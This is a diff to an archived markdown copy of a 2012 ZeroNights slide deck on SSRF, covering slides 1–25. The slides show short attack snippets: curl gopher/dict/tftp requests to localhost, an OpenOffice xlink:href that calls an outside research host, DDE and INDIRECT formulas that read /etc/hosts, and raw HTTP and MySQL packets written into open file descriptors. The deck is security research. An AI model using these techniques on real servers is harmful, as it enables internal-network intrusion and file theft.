@@ -3,45 +3,42 @@ type: Slides
 title: "SSRF attacks and sockets: smorgasbord of vulnerabilities"
 description: "A ZeroNights deck treating SSRF as a general socket-forging class rather than a URL bug. It walks gopher, dict and tftp schemes through cURL, OpenOffice DDE and xlink:href, reuse of already-open file descriptors via /proc and fd://, memcached key rewriting for sniffer injection and privilege escalation, and PHP FastCGI header overwrite for RCE."
 resource: "https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
-tags: [slides, webseclist-reference, en, slideshare-net, ssrf, php, rce, url-parsing, request-smuggling, filter-bypass, privilege-escalation, owasp-a01-2021, owasp-a05-2021, owasp-a10-2021]
+tags: [slides, webseclist-reference, onsec-zeronights, ssrf, php, rce, url-parsing, request-smuggling, filter-bypass, privilege-escalation, owasp-a01-2021, owasp-a05-2021, owasp-a10-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T15:59:52+00:00"
+  at: "2026-09-10T01:21:53+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-09-10
 sources:
   - id: original
     resource: "https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
     title: "SSRF attacks and sockets: smorgasbord of vulnerabilities"
     author: Vladimir Vorontsov, Alexander Golovko
-  - id: canonical
-    resource: "https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
-  - id: capture
-    resource: "https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
+    last_modified: 2012-11-20
 also_at: []
 authors:
   - Vladimir Vorontsov
   - Alexander Golovko
-canonical_url: "https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
+canonical_url: ""
 cited_by:
   - "2012.md:6"
 commit: ""
-content_sha256: 51037a288514b9113e77a24c30a1c5994a2c828293732f8d8db0ff88bab689af
+content_sha256: 0a2113fa1252d9f6391dc77d9d5ce5734df48074294d6efe72f30dc6ae485bac
 depth: full
 depth_reason: default
 kind: slides
-language: en
+language: ""
 licence: unknown
 original_url: "https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
-published: ""
-publisher: slideshare.net
+published: 2012-11-20
+publisher: ONsec / ZeroNights
 publisher_english: ""
-raw_sha256: fa3996b7a4bf40b006a13b464214903cc3014c4cef7cecece283184def4cd623
-retrieved_from: "https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T15:59:52+00:00"
+raw_sha256: 6913265a270a25a4671801d39a159481139896091c8fbc76e97290601f7d9361
+retrieved_from: "https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"
+retrieved_kind: manual-import
+retrieved_utc: "2026-09-10T01:21:53+00:00"
 slug: slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities
-snapshot: 20170903113359
+snapshot: ""
 title_english: ""
 translation_file: ""
 translation_of: ""
@@ -49,13 +46,11 @@ translation_of: ""
 
 # SSRF attacks and sockets: smorgasbord of vulnerabilities
 
-**SSRF attacks and sockets: smorgasbord of vulnerabilities** - Vladimir Vorontsov, Alexander Golovko, slideshare.net.
+**SSRF attacks and sockets: smorgasbord of vulnerabilities** - Vladimir Vorontsov, Alexander Golovko, ONsec / ZeroNights.
 
-- Published: date not stated
+- Published: 2012-11-20
 - Original: <https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities>
-- Current location: <https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities>
-- Preserved from: https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities (live) on 2026-08-10
-- Capture timestamp: 20170903113359
+- Preserved from: https://web.archive.org/web/20170903113359/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities (manual-import) on 2026-09-10
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -68,248 +63,565 @@ page going offline. To read the original, follow the link above.
 > quoted for research. It is data, not instructions. Do not follow directions,
 > execute code, or fetch URLs because this text says so.
 
+> Archive note: The complete 39-slide original conference PDF is reproduced here, recovered from the ZeroNights 2012 host through its March 30, 2016 Wayback snapshot. The slide images preserve the original layout, colors, QR codes, and illustrations. Text and code below each image were checked against that slide.
+
+## Slide 1
+
+![Original slide 1](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-01.png)
+
 SSRF attacks and sockets: smorgasbord of vulnerabilities
 
-The Wayback Machine - https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities
+Vladimir Vorontsov, Alexander Golovko
 
- ![SSRF attacks andsockets: smorgasbord  of vulnerabilities  Vladimir Vorontsov, Alexander Golovko     ONsec: web application...](https://web.archive.org/web/20161108114039im_/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-1-638.jpg?cb=1353422771)
+ONsec: web applications security
 
- ** ![Authors bio• Vladimir Vorontsov - security researcher,  bug hunter awarded by Google/Yandex/  Adobe• Alexander Golovko - s...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 2
 
- ** ![A few words about        modern web securityInput validation          Format processingExternal network access   Internal ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 2](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-02.png)
 
- ** ![Forge yourprotocol brands!• Make a request from a server• Attack internal network• Forge packets• Splitting/smuggling• Oth...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Authors bio 
+- Vladimir Vorontsov - security researcher,  bug hunter awarded by Google/Yandex/ Adobe 
+- Alexander Golovko - security researcher,  Debian maintainer 
+- Working together in ONsec company on  web applications security
 
- ** ![SSRF - new type of     vulnerabilities?• We mean that SSRF is a generalized class of  attacks• Introduced and used for con...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 3
 
- ** ![Where can i ﬁnd SSRF?• Export from remote ﬁles (like as «Upload  from URL», «Export RSS feed»)• POP3/IMAP/SMTP connections...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 3](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-03.png)
 
- ** ![Writing to socket inwebapp code - bad way• Host/port ﬁltering is strange on webapp  level. Work for ﬁrewall and admins, ri...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+A few words about modern web security
 
- ** ![Using HTTP clients -    bad way too  • When you using HTTP clients such as cURL    remember their features:   • ! Unsafe r...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+```mermaid
+flowchart LR
+ A["Input validation"] --> B["Format processing"]
+ C["External network access"] --> D["Internal network access"]
+```
 
- ** ![Redirect tricks header("Location: ".$_GET[r]);• Bypass webapp ﬁlters i.e. preg_replace  using redirect • any host -> local...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 4
 
- ** ![Dict schema• http://tools.ietf.org/html/rfc2229• curl dict://localhost:8000/GET / HTTP/1.1• Receive on server:     CLIENT ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 4](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-04.png)
 
- ** ![Gopher schema•   http://www.ietf.org/rfc/rfc1436.txt•   TCP packets with your content•   Without r n t chars by RFC (and 0...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+- Make a request from a server 
+- Attack internal network 
+- Forge packets 
+- Splitting/smuggling 
+- Other protocols! 
+- Universal ways such as gopher:// 
+- Exploit anything ;) Forge your protocol brands!
 
- ** ![Gopher schema• PHP doesn’t support gopher  protocol!• Do not worry! PHP supports all  vulnerabilities!• --with-curlwrapper...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 5
 
- ** ![TFTP schema• http://www.ietf.org/rfc/rfc1350.txt• UDP packets with your content (w/o 00 in      cUrl) and 0x00 0x01 ﬁrst b...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 5](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-05.png)
 
- ** ![TFTP schema• Currently working on splitting datagrams  to bypass 0x00 0x01 header in second  packet• Without stable result...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+SSRF - new type of  vulnerabilities? 
+- We mean that SSRF is a generalized class of  attacks 
+- Introduced and used for convenience 
+- Several vulnerabilities together or only one  can lead to SSRF attacks 
+- To vulns classification use CWE ;)
 
- ** ![Various format       processing issues•   XML - External Entities, Signatures, WS etc (see    http://erpscan.com/wp-conten...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 6
 
- ** ![OpenOfﬁce - pretty        good stuff•   Universal solution to convert ofﬁce documents•   Common in Enterprise system and l...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 6](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-06.png)
 
- ** ![OpenOfﬁce - pretty             good stuff for SSRF•   RTFM http://docs.oasis-open.org/ofﬁce/v1.2/•   Find all tags with xl...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Where can i find SSRF? 
+- Export from remote files (like as «Upload  from URL», «Export RSS feed») 
+- POP3/IMAP/SMTP connections from  webapps 
+- File format processing (XML, docx,  archives, etc) 
+- Databases 
+- Others ...
 
- ** ![OpenOfﬁce - pretty             good stuff for SSRF•   Formula for happiness•   DDE is your friend•   =DDE("sofﬁce","ﬁle://...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 7
 
- ** ![SSRF exploitation ways• Open new socket• Use already opened sockets/ﬁles  (authorized)• Where can i ﬁnd opened sockets/ﬁles?](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 7](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-07.png)
 
- ** ![File descriptors: basics• Where does ﬁles in SSRF theme?• Data streams basics: sockets and ﬁles, etc• File descriptor - po...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Writing to socket in  webapp code - bad way 
+- Host/port filtering is strange on webapp  level. Work for firewall and admins, right? 
+- Protocol smuggling (CRLF and others) 
+- What you mean when send in socket  «`GET / HTTP/1.1\r\nHost: dom\r\n\r\n`» ? 
+- And what server mean when receive this?
 
- ** ![File descriptors: API•   FD have minimum number by default (easy brute)•   Access to already opened FDs:    •   PHP 5.3.3 ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 8
 
- ** ![File descriptors: ProcFS•   Special pseudo ﬁles system•   Common in Linux, available in FreeBSD (not by default)•   While ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 8](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-08.png)
 
- ** ![File descriptors: cases•   Already opened FDs:    •   May be opened with privileges greater than current    •   In sockets...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Using HTTP clients -  bad way too 
+- When you using HTTP clients such as cURL  remember their features: 
+- ! Unsafe redirect (http:// --> file://) 
+- Various protocols support (gopher:// dict://  tftp:// rtsp:// ) 
+- Maximum URL length is more than  browsers value (100Mb URL is OK)
 
- ** ![Stuff here:        File descriptors:            examples •   Write a HTTP packet into opened FD to forge     server output...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 9
 
- ** ![Database connections              pool• Pool is array of sockets with   authorized sessions • Start when application serve...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 9](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-09.png)
 
- ** ![PHP fastcgi SSRF RCE•   Set php_admin_value, php_admin_ ﬂag from Stuff here:    frontend•   Access to fastcgi over socket ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Redirect tricks
 
- ** ![Want something really cool?](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+```
+header("Location: ".$_GET['r']);
+```
 
- ** ![Memcached SSRF: easyand very dangerously• Host-basic auth in general• TCP and UDP sockets by default• At the same host wit...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+- Bypass webapp filters i.e. preg_replace using redirect
+- any host -> localhost
+- valid port -> any port
+- valid schema -> any schema
+- SOP for browsers, not for HTTPClients
 
- ** ![Memcached SSRF:      exploitation     methodology• Collect all available keys• Sort keys by name, determine interesting• F...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 10
 
- ** ![Memcached SSRF: inject       sniffer• Find html/js/etc template of login page in  memcached values• Insert your login/pass...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 10](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-10.png)
 
- ** ![Memcached SSRF:dynamic templates RCE• Find template with interpreter’s code• Modify code to arbitrary• Call page with targ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Dict schema
 
- ** ![Memcached SSRF:escalate your privileges• Find session in memcached keys• Determine key which contain privileges ﬂag  of yo...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+OCTOBER 1997
 
- ** ![Format SSRF answer to  read data (HTTP)• In many cases webapp logic provide reading  only one output format (such as image...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+- http://tools.ietf.org/html/rfc2229
 
- ** ![Format SSRF answer to  read data (HTTP)$f=fsockopen("localhost",80);fputs($f,"GET /$path HTTP/1.1rnHost:localhostrnrn");  ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+```
+curl dict://localhost:8000/GET / HTTP/1.1
+```
 
- ** ![Format SSRF answer to    read data (HTTP) GET /head HTTP/1.1                       HTTP/1.1 200 OK Host: localhost        ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Receive on server:
 
- ** ![Format SSRF answer to  read data (HTTP)• How to create header and footer as you  want?• Range HTTP header is your friend• ...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+```
+CLIENT libcurl 7.24.0
+GET / HTTP/1.1
+QUIT
+```
 
- ** ![What about images?• Valid JPG with data which you want  to read in EXIF• GIF header and your data at EOF• Inject data into...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+## Slide 11
 
- ** ![What about hosting      centers?• TFTP server contain machine images• Machines get TFTP images until netboot• Attacker may...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+![Original slide 11](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-11.png)
 
- ** ![What the next?• SSRF bible cheatsheet available now!• https://docs.google.com/document/d/  1v1TkWZtrhzRLy0bYXBcdLUedXGb9nj...](https://web.archive.org/web/20161108114039im_/http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+Gopher schema
 
- Upcoming SlideShare
+MARCH 1993
 
-Loading in …5
+- http://www.ietf.org/rfc/rfc1436.txt
+- TCP packets with your content
+- Without `\r \n \t` chars by RFC (and `\00` for cURL). But all chars in LWP, Java, ASP.Net ;)
+- By Polyakov/Chastukhin [ERPscan] at BH_US_12 and CVE-2012-5085 (fixed now)
 
-×
+```
+curl gopher://localhost:8000/2MyData
+# nc -vv -l -p 8000
+listening on [any] 8000 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 64096
+MyData
+```
 
-  52,564 views
+## Slide 12
 
--
--  Like
--   Download
+![Original slide 12](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-12.png)
 
- [ ![Ivan Novikov](https://web.archive.org/web/20161108114039im_/http://cdn.slidesharecdn.com/profile-photo-d0znpp-48x48.jpg?cb=1458863924) ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideview)
+Gopher schema 
+- PHP doesn’t support gopher  protocol! 
+- Do not worry! PHP supports all  vulnerabilities! 
+- --with-curlwrappers provide gopher  protocol in file_get_contents and  others such as XXE
 
-##  [ Ivan Novikov](https://web.archive.org/web/20161108114039/http://www.slideshare.net/d0znpp?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideview)
+## Slide 13
 
-, Security Expert  at ONsec
+![Original slide 13](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-13.png)
 
-  [ ** Follow ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/signup?login_source=slideview.popup.follow&from=addcontact&from_source=http%3A%2F%2Fwww.slideshare.net%2Fd0znpp%2Fssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+TFTP schema 
+- http://www.ietf.org/rfc/rfc1350.txt 
+- UDP packets with your content (w/o `\00` in cUrl) and 0x00 0x01 first bytes (really bad) 
+- `curl tftp://localhost:64/MyUdpPacketHere` 
 
-  Published on Nov 20, 2012
+```
+02:11:21.378724 IP6 localhost.55928 > localhost.64: UDP, length 54
+0x0000:  6000 0000 003e 1140 0000 0000 0000 0000  `....>.@........
+0x0010:  0000 0000 0000 0001 0000 0000 0000 0000  ................
+0x0020:  0000 0000 0000 0001 da78 2bcb 003e 0051  .........x+..>.Q
+0x0030:  0001 4d79 5564 7050 6163 6b65 7448 6572  ..MyUdpPacketHer
+0x0040:  6500 6f63 7465 7400 7473 697a 6500 3000  e.octet.tsize.0.
+0x0050:  626c 6b73 697a 6500 3531 3200 7469 6d65  blksize.512.time
+0x0060:  6f75 7400 3600                                           out.6.
+```
 
- “SSRF attacks and sockets: smorgasbord of vulnerabilities”
+## Slide 14
 
-Speakers: Vladimir Vorontsov, Alexander Golovko
+![Original slide 14](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-14.png)
 
-The report described server request forgery vulnerabilities (Server Side Request Forgery — SSRF) in terms of their practical applications to perform various attacks. The various vulnerabilities and attacks with the using sockets were researched. Such as controlling of the HTTP response, database operations, and even remote code execution. Special attention is given to the above attacks, relevant for the PHP interpreter. The above methods and techniques of the attacks have been developed and successfully used in the course of security audits of real web applications.
+TFTP schema 
+- Currently working on splitting datagrams  to bypass 0x00 0x01 header in second  packet 
+- Without stable results now unfort ;(
 
-  ...**
+## Slide 15
 
- Published in: [Technology](https://web.archive.org/web/20161108114039/http://www.slideshare.net/featured/category/technology)
+![Original slide 15](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-15.png)
 
-     1 Comment     **  34 Likes      ** Statistics     ** Notes
+Various format  processing issues 
+- XML - External Entities, Signatures, WS etc (see  http://erpscan.com/wp-content/uploads/2012/11/SSRF.2.0.poc_.pdf and http://www.slideshare.net/d0znpp/onsec-phdays-2012-xxe-incapsulated-report) 
+- OpenOffice products (Draw, Calc and others) 
+- All soft which can open sockets (provide links  to external files in file format) - all modern soft 
+- others (see you at HITB 2013)
 
--
+## Slide 16
 
- [ ![CihanOncu](https://web.archive.org/web/20161108114039im_/http://public.slidesharecdn.com/b/images/user-48x48.png) ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/CihanOncu?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+![Original slide 16](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-16.png)
 
- [ Cihan Öncü   , Senior Information Security Specialist   at Biznet Bilişim
+OpenOffice - pretty  good stuff 
+- Universal solution to convert office documents 
+- Common in Enterprise system and large portals 
+- Many forks (Libre and others) 
+- What happens while uploaded document is  converted? 
+- What about links to external files in the  documents?
 
-  ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/CihanOncu?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+## Slide 17
 
--
+![Original slide 17](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-17.png)
 
- [ ![JackGlazko](https://web.archive.org/web/20161108114039im_/http://public.slidesharecdn.com/b/images/user-48x48.png) ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/JackGlazko?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+OpenOffice - pretty good stuff for SSRF
 
- [ Jack Glazko   , Vice President of Software at Kleinschmidt   at Kleinschmidt
+- RTFM http://docs.oasis-open.org/office/v1.2/
+- Find all tags with xlink:href attribute
+- Do not forget about macros and applets (but really rare activated)
+- Exploit it!
 
-  ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/JackGlazko?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+```
+<draw:image xlink:href="http://ololo.onsec.ru/?i’mSSRFed" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
+```
 
--
+## Slide 18
 
- [ ![raghavendrangopal](https://web.archive.org/web/20161108114039im_/http://public.slidesharecdn.com/b/images/user-48x48.png) ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/raghavendrangopal?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+![Original slide 18](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-18.png)
 
- [ Raghavendran G   , Security Engineer at Confidential company   at Confidencial company
+OpenOffice - pretty good stuff for SSRF
 
-  ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/raghavendrangopal?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+- Formula for happiness
+- DDE is your friend
 
--
+```
+=DDE("soffice","file://i-want-to-read-this-file...)
+```
 
- [ ![raghav89](https://web.archive.org/web/20161108114039im_/http://public.slidesharecdn.com/b/images/user-48x48.png) ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/raghav89?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+Use simple formula to full path disclosure
 
- [ anna university      at anna university
+```
+=CELL("filename")
+```
 
-  ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/raghav89?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+Address links
 
--
+```
+A1='file:///etc/hosts'#$Sheet1.A1:B31
+B1=INDIRECT(A1)
+```
 
- [ ![leejiseong75](https://web.archive.org/web/20161108114039im_/http://public.slidesharecdn.com/b/images/user-48x48.png) ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/leejiseong75?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+## Slide 19
 
- [ Lee Ji Seong   , 3기 교육생   at KITRI 'Best of the Best'
+![Original slide 19](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-19.png)
 
-  ](https://web.archive.org/web/20161108114039/http://www.slideshare.net/leejiseong75?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideshow)
+SSRF exploitation ways 
+- Open new socket 
+- Use already opened sockets/files  (authorized) 
+- Where can i find opened sockets/files?
 
-  Show More
+## Slide 20
 
-No Downloads
+![Original slide 20](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-20.png)
 
- **Views**
+File descriptors: basics 
+- Where does files in SSRF theme? 
+- Data streams basics: sockets and files, etc 
+- File descriptor - pointer to data stream 
+- Each process have their own FD 
+- dup, fork, exec - O_CLOEXEC 
+- New data stream - new FD 
+- Privileges while creating FD, not while  access
 
-Total views
+## Slide 21
 
- 52,564
+![Original slide 21](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-21.png)
 
-On SlideShare
+File descriptors: API 
+- FD have minimum number by default (easy brute) 
+- Access to already opened FDs: 
+- PHP 5.3.3 <= 5.3.14 provide special wrapper fd:// to  use FD simplest (later only on CLI mode) 
+- Java: `java.io.FileDescriptor` 
+- Perl: `open AA, ‘>&2’; print AA ‘DataToFD’;` 
+- Python: `os.open + os.write` 
+- Ruby: `fd=IO.new(99,’w’);fd.write(‘ToFD-№99’);` 
+- Shell I/O redirection: `$echo 123 > &2` 
+- Privileges for chuid programs
 
-From Embeds
+## Slide 22
 
- 0
+![Original slide 22](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-22.png)
 
-Number of Embeds
+File descriptors: ProcFS 
+- Special pseudo files system 
+- Common in Linux, available in FreeBSD (not by default) 
+- While opening `/proc/<PID>/fd/<N>` new datastream will  be create with the same parameters (!not the same as  FD API access to FD directly!) 
+- You need together two FS privileges to access /proc 
+- privileges on `/proc/<PID>/fd/<N>` 
+- privileges on target file (!but not directories) 
+- Examples: 
+- RHEL /var/log/httpd/ - 0700, but access.log - 0644 
+- Debian before first rotate access.log - 0644, than 0640
 
- 8,612
+## Slide 23
 
- **Actions**
+![Original slide 23](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-23.png)
 
-Shares
+File descriptors: cases 
+- Already opened FDs: 
+- May be opened with privileges greater than current 
+- In sockets case may be already authorized 
+- Typical case: starting Apache: 
+- open sockets to listen (80,443) by root 
+- open error/access.logs by root 
+- fork childs 
+- chuid() to www-data for all forks 
+- You may write to error/access.logs and sockets from  child processes
 
-Downloads
+## Slide 24
 
- 393
+![Original slide 24](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-24.png)
 
-Comments
+File descriptors: examples
 
- 1
+SPECIAL FOR CLOUDS
 
-Likes
+Stuff here:
 
- 34
+Write a HTTP packet into opened FD to forge server output (to current client):
 
- ** Embeds 0 **
+```
+fd6.write("HTTP 200 OK\r\nHost: localhost\r\n...");//also forge logs
+```
 
-No embeds
+Write a MySQL packet into opened FD to do SQL command:
 
----
+```
+fd1.write("\x22\x00\x00\x00\x03INSERT INTO aa VALUES(1,'fwrite')");
+```
 
- ****
+## Slide 25
 
- 
+![Original slide 25](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-25.png)
 
- 
+Database connections  pool 
+- Pool is array of sockets with  authorized sessions 
+- Start when application server  started and never close while app  server working 
+- May be many pools with different  privileges (but not different for  SSRF)
 
-No notes for slide
+## Slide 26
 
